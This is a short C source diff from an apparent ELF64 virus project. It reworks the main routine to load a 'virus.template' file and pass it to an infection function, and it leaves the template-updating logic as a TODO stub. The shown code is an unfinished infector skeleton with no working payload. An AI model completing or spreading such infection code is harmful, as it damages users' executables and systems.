@@ -14,18 +14,17 @@ int usage(char *name){
 	return -1;
 }
 
-int infect(char *fname){
-	if (isFile(fname) == FALSE) return fail("not file");
-	if (isElf64(fname) == FALSE) return fail("not elf64 binary");
-	char *s; size_t n;
-	fget(fname, &s, &n);	
-	fput("");
-	return TRUE;
+void update_template(char *t, size_t n){
+	//add a few information about himself
+	//TODO
 }
 
 int main(int ac, char **av){
 	if (ac < 2){
 		return usage(av[0]);
 	}
-	return infect(av[1]);
+	char *template; size_t n;
+	fget("bin/virus.template", &template, &n);
+	update_template(template, n);
+	return infect(av[1], template, n) == FALSE;
 }
